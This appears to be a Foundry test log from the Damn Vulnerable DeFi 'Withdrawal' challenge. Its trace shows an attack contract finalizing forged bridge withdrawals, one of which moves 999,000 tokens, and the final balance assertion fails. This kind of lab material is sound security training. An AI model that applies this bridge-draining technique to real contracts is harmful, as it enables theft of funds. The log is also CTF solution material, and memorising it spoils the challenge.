@@ -1,0 +1,125 @@
+$ forge test --match-path test/withdrawal/Withdrawal.t.sol -vvv
+
+STDOUT
+Compiling 190 files with Solc 0.8.25
+Solc 0.8.25 finished in 5.82s
+Compiler run successful!
+
+Ran 2 tests for test/withdrawal/Withdrawal.t.sol:WithdrawalChallenge
+[PASS] test_assertInitialState() (gas: 50741)
+[FAIL: assertion failed: 970000000000000000000 <= 990000000000000000000000] test_withdrawal() (gas: 1634314)
+Traces:
+  [1634314] WithdrawalChallenge::test_withdrawal()
+    ├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C])
+    │   └─ ← [Return]
+    ├─ [305] L1Gateway::DELAY() [staticcall]
+    │   └─ ← [Return] 604800 [6.048e5]
+    ├─ [0] VM::warp(1719391928 [1.719e9])
+    │   └─ ← [Return]
+    ├─ [0] VM::store(L1Forwarder: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 0x5c5881ebecb1e500129ea7df33a578dbf273442e1a928faf73013873f253b904, 0x0000000000000000000000000000000000000000000000000000000000000001)
+    │   └─ ← [Return]
+    ├─ [1053754] → new WithdrawalAttack@0xce110ab5927CC46905460D930CCa0c6fB4666219
+    │   ├─ [440672] → new Merkle@0x9B257fdD2D919d86B1CB04bfb7D939047BeF5c31
+    │   │   └─ ← [Return] 2201 bytes of code
+    │   └─ ← [Return] 2788 bytes of code
+    ├─ [524433] WithdrawalAttack::execute()
+    │   ├─ [4226] Merkle::getProof([0xeaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba, 0x0b130175aeb6130c81839d7ad4f580cd18931caf177793cd3bab95b8cbb8de60, 0xbaee8dea6b24d327bc9fcd7ce867990427b9d6f48a92f4b331514ea688909015, 0x9a8dbccb6171dc54bfcff6471f4194716688619305b6ededc54108ec35b39b09], 0) [staticcall]
+    │   │   └─ ← [Return] [0x0b130175aeb6130c81839d7ad4f580cd18931caf177793cd3bab95b8cbb8de60, 0xed6f88d195e40267b3203b6ab7fefe634dec68c7ea96528cfb383f747f70ba75]
+    │   ├─ [4204] Merkle::getProof([0xeaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba, 0x0b130175aeb6130c81839d7ad4f580cd18931caf177793cd3bab95b8cbb8de60, 0xbaee8dea6b24d327bc9fcd7ce867990427b9d6f48a92f4b331514ea688909015, 0x9a8dbccb6171dc54bfcff6471f4194716688619305b6ededc54108ec35b39b09], 1) [staticcall]
+    │   │   └─ ← [Return] [0xeaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba, 0xed6f88d195e40267b3203b6ab7fefe634dec68c7ea96528cfb383f747f70ba75]
+    │   ├─ [4204] Merkle::getProof([0xeaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba, 0x0b130175aeb6130c81839d7ad4f580cd18931caf177793cd3bab95b8cbb8de60, 0xbaee8dea6b24d327bc9fcd7ce867990427b9d6f48a92f4b331514ea688909015, 0x9a8dbccb6171dc54bfcff6471f4194716688619305b6ededc54108ec35b39b09], 2) [staticcall]
+    │   │   └─ ← [Return] [0x9a8dbccb6171dc54bfcff6471f4194716688619305b6ededc54108ec35b39b09, 0x236ea1b675f756b4907279acf83a0d2477c4105979082de05651a6098164115a]
+    │   ├─ [4182] Merkle::getProof([0xeaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba, 0x0b130175aeb6130c81839d7ad4f580cd18931caf177793cd3bab95b8cbb8de60, 0xbaee8dea6b24d327bc9fcd7ce867990427b9d6f48a92f4b331514ea688909015, 0x9a8dbccb6171dc54bfcff6471f4194716688619305b6ededc54108ec35b39b09], 3) [staticcall]
+    │   │   └─ ← [Return] [0xbaee8dea6b24d327bc9fcd7ce867990427b9d6f48a92f4b331514ea688909015, 0x236ea1b675f756b4907279acf83a0d2477c4105979082de05651a6098164115a]
+    │   ├─ [162122] L1Gateway::finalizeWithdrawal(0, l2Handler: [0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16], L1Forwarder: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 1718786915 [1.718e9], 0x01210a380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000, [0x0b130175aeb6130c81839d7ad4f580cd18931caf177793cd3bab95b8cbb8de60, 0xed6f88d195e40267b3203b6ab7fefe634dec68c7ea96528cfb383f747f70ba75])
+    │   │   ├─ emit ValidProof(proof: [0x0b130175aeb6130c81839d7ad4f580cd18931caf177793cd3bab95b8cbb8de60, 0xed6f88d195e40267b3203b6ab7fefe634dec68c7ea96528cfb383f747f70ba75], root: 0x4e0f53ae5c8d5bc5fd1a522b9f37edfd782d6f4c7d8e0df1391534c081233d9e, leaf: 0xeaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba)
+    │   │   ├─ [100655] L1Forwarder::forwardMessage(0, 0x328809Bc894f92807417D2dAD6b7C998c1aFdac6, TokenBridge: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], 0x81191e51000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000000000000000000000000000008ac7230489e80000)
+    │   │   │   ├─ [425] L1Gateway::xSender() [staticcall]
+    │   │   │   │   └─ ← [Return] l2Handler: [0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16]
+    │   │   │   ├─ [38934] TokenBridge::executeTokenWithdrawal(0x328809Bc894f92807417D2dAD6b7C998c1aFdac6, 10000000000000000000 [1e19])
+    │   │   │   │   ├─ [364] L1Forwarder::getSender() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x328809Bc894f92807417D2dAD6b7C998c1aFdac6
+    │   │   │   │   ├─ [29670] DamnValuableToken::transfer(0x328809Bc894f92807417D2dAD6b7C998c1aFdac6, 10000000000000000000 [1e19])
+    │   │   │   │   │   ├─ emit Transfer(from: TokenBridge: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], to: 0x328809Bc894f92807417D2dAD6b7C998c1aFdac6, amount: 10000000000000000000 [1e19])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit FinalizedWithdrawal(leaf: 0xeaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba, success: true, isOperator: false)
+    │   │   └─ ← [Stop]
+    │   ├─ [111612] L1Gateway::finalizeWithdrawal(1, l2Handler: [0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16], L1Forwarder: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 1718786965 [1.718e9], 0x01210a3800000000000000000000000000000000000000000000000000000000000000010000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e510000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000, [0xeaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba, 0xed6f88d195e40267b3203b6ab7fefe634dec68c7ea96528cfb383f747f70ba75])
+    │   │   ├─ emit ValidProof(proof: [0xeaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba, 0xed6f88d195e40267b3203b6ab7fefe634dec68c7ea96528cfb383f747f70ba75], root: 0x4e0f53ae5c8d5bc5fd1a522b9f37edfd782d6f4c7d8e0df1391534c081233d9e, leaf: 0x0b130175aeb6130c81839d7ad4f580cd18931caf177793cd3bab95b8cbb8de60)
+    │   │   ├─ [78055] L1Forwarder::forwardMessage(1, 0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e, TokenBridge: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], 0x81191e510000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000000000000000000000000000008ac7230489e80000)
+    │   │   │   ├─ [425] L1Gateway::xSender() [staticcall]
+    │   │   │   │   └─ ← [Return] l2Handler: [0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16]
+    │   │   │   ├─ [26834] TokenBridge::executeTokenWithdrawal(0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e, 10000000000000000000 [1e19])
+    │   │   │   │   ├─ [364] L1Forwarder::getSender() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e
+    │   │   │   │   ├─ [24870] DamnValuableToken::transfer(0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e, 10000000000000000000 [1e19])
+    │   │   │   │   │   ├─ emit Transfer(from: TokenBridge: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], to: 0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e, amount: 10000000000000000000 [1e19])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit FinalizedWithdrawal(leaf: 0x0b130175aeb6130c81839d7ad4f580cd18931caf177793cd3bab95b8cbb8de60, success: true, isOperator: false)
+    │   │   └─ ← [Stop]
+    │   ├─ [111632] L1Gateway::finalizeWithdrawal(2, l2Handler: [0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16], L1Forwarder: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 1718787050 [1.718e9], 0x01210a380000000000000000000000000000000000000000000000000000000000000002000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e00000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e000000000000000000000000000000000000000000000d38be6051f27c260000000000000000000000000000000000000000000000000000000000000, [0x9a8dbccb6171dc54bfcff6471f4194716688619305b6ededc54108ec35b39b09, 0x236ea1b675f756b4907279acf83a0d2477c4105979082de05651a6098164115a])
+    │   │   ├─ emit ValidProof(proof: [0x9a8dbccb6171dc54bfcff6471f4194716688619305b6ededc54108ec35b39b09, 0x236ea1b675f756b4907279acf83a0d2477c4105979082de05651a6098164115a], root: 0x4e0f53ae5c8d5bc5fd1a522b9f37edfd782d6f4c7d8e0df1391534c081233d9e, leaf: 0xbaee8dea6b24d327bc9fcd7ce867990427b9d6f48a92f4b331514ea688909015)
+    │   │   ├─ [78055] L1Forwarder::forwardMessage(2, 0xea475d60c118d7058beF4bDd9c32bA51139a74e0, TokenBridge: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], 0x81191e51000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e000000000000000000000000000000000000000000000d38be6051f27c2600000)
+    │   │   │   ├─ [425] L1Gateway::xSender() [staticcall]
+    │   │   │   │   └─ ← [Return] l2Handler: [0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16]
+    │   │   │   ├─ [26834] TokenBridge::executeTokenWithdrawal(0xea475d60c118d7058beF4bDd9c32bA51139a74e0, 999000000000000000000000 [9.99e23])
+    │   │   │   │   ├─ [364] L1Forwarder::getSender() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0xea475d60c118d7058beF4bDd9c32bA51139a74e0
+    │   │   │   │   ├─ [24870] DamnValuableToken::transfer(0xea475d60c118d7058beF4bDd9c32bA51139a74e0, 999000000000000000000000 [9.99e23])
+    │   │   │   │   │   ├─ emit Transfer(from: TokenBridge: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], to: 0xea475d60c118d7058beF4bDd9c32bA51139a74e0, amount: 999000000000000000000000 [9.99e23])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit FinalizedWithdrawal(leaf: 0xbaee8dea6b24d327bc9fcd7ce867990427b9d6f48a92f4b331514ea688909015, success: true, isOperator: false)
+    │   │   └─ ← [Stop]
+    │   ├─ [111622] L1Gateway::finalizeWithdrawal(3, l2Handler: [0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16], L1Forwarder: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 1718787127 [1.718e9], 0x01210a380000000000000000000000000000000000000000000000000000000000000003000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000, [0xbaee8dea6b24d327bc9fcd7ce867990427b9d6f48a92f4b331514ea688909015, 0x236ea1b675f756b4907279acf83a0d2477c4105979082de05651a6098164115a])
+    │   │   ├─ emit ValidProof(proof: [0xbaee8dea6b24d327bc9fcd7ce867990427b9d6f48a92f4b331514ea688909015, 0x236ea1b675f756b4907279acf83a0d2477c4105979082de05651a6098164115a], root: 0x4e0f53ae5c8d5bc5fd1a522b9f37edfd782d6f4c7d8e0df1391534c081233d9e, leaf: 0x9a8dbccb6171dc54bfcff6471f4194716688619305b6ededc54108ec35b39b09)
+    │   │   ├─ [78055] L1Forwarder::forwardMessage(3, 0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b, TokenBridge: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], 0x81191e51000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000000000000000000000000000008ac7230489e80000)
+    │   │   │   ├─ [425] L1Gateway::xSender() [staticcall]
+    │   │   │   │   └─ ← [Return] l2Handler: [0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16]
+    │   │   │   ├─ [26834] TokenBridge::executeTokenWithdrawal(0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b, 10000000000000000000 [1e19])
+    │   │   │   │   ├─ [364] L1Forwarder::getSender() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b
+    │   │   │   │   ├─ [24870] DamnValuableToken::transfer(0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b, 10000000000000000000 [1e19])
+    │   │   │   │   │   ├─ emit Transfer(from: TokenBridge: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], to: 0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b, amount: 10000000000000000000 [1e19])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ emit FinalizedWithdrawal(leaf: 0x9a8dbccb6171dc54bfcff6471f4194716688619305b6ededc54108ec35b39b09, success: true, isOperator: false)
+    │   │   └─ ← [Stop]
+    │   └─ ← [Stop]
+    ├─ [0] VM::stopPrank()
+    │   └─ ← [Return]
+    ├─ [516] DamnValuableToken::balanceOf(TokenBridge: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50]) [staticcall]
+    │   └─ ← [Return] 970000000000000000000 [9.7e20]
+    ├─ [0] VM::assertLt(970000000000000000000 [9.7e20], 1000000000000000000000000 [1e24]) [staticcall]
+    │   └─ ← [Return]
+    ├─ [516] DamnValuableToken::balanceOf(TokenBridge: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50]) [staticcall]
+    │   └─ ← [Return] 970000000000000000000 [9.7e20]
+    ├─ [0] VM::assertGt(970000000000000000000 [9.7e20], 990000000000000000000000 [9.9e23]) [staticcall]
+    │   └─ ← [Revert] assertion failed: 970000000000000000000 <= 990000000000000000000000
+    └─ ← [Revert] assertion failed: 970000000000000000000 <= 990000000000000000000000
+
+Backtrace:
+  at VM.assertGt
+  at WithdrawalChallenge.test_withdrawal
+
+Suite result: FAILED. 1 passed; 1 failed; 0 skipped; finished in 2.13ms (897.31µs CPU time)
+
+Ran 1 test suite in 19.49ms (2.13ms CPU time): 1 tests passed, 1 failed, 0 skipped (2 total tests)
+
+Failing tests:
+Encountered 1 failing test in test/withdrawal/Withdrawal.t.sol:WithdrawalChallenge
+[FAIL: assertion failed: 970000000000000000000 <= 990000000000000000000000] test_withdrawal() (gas: 1634314)
+
+Encountered a total of 1 failing tests, 1 tests succeeded
+
+Tip: Run `forge test --rerun` to retry only the 1 failed test
+
+
+STDERR
+
